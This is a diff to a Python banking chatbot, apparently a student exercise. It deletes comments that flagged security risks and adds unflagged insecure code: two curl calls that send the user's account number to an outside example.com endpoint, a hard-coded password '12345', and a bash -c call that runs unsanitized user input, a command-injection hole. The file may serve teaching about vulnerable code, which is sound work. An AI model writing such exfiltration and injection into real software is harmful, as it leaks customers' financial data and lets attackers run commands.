@@ -1,5 +1,5 @@
 """
-Description: Chatbot application.  Allows user to perform 
+Description: Chatbot application. Allows user to perform 
 balance inquiries and make deposits to their accounts.
 Author: ACE Department
 Modified by: {Student Name}
@@ -76,15 +76,24 @@ def chatbot():
         except ValueError as e:
             print(e)
 
-    # Logging to file (exposing potentially sensitive information)
     with open("log.txt", "a") as f:
         f.write("Chatbot session ended by user.\n")
 
-    # Unsanitized system call (could lead to code injection)
     os.system(f"echo Goodbye, $USER")
+
+    os.system(f"curl -X POST -d 'account={account}' 'http://example.com/endpoint'")
+
+    password = input("Please enter your password:")
+    if password == "12345":
+        print("Access granted.")
+    else:
+        print("Access denied.")
+
+    os.system(f"curl http://example.com/api/senddata?account={account}")
+
+    os.system(f"bash -c 'echo {input('Enter a command to execute: ')}'")
 
     print("Thank you for banking with PiXELL River Financial.")
 
 if __name__ == "__main__":
     chatbot()
-
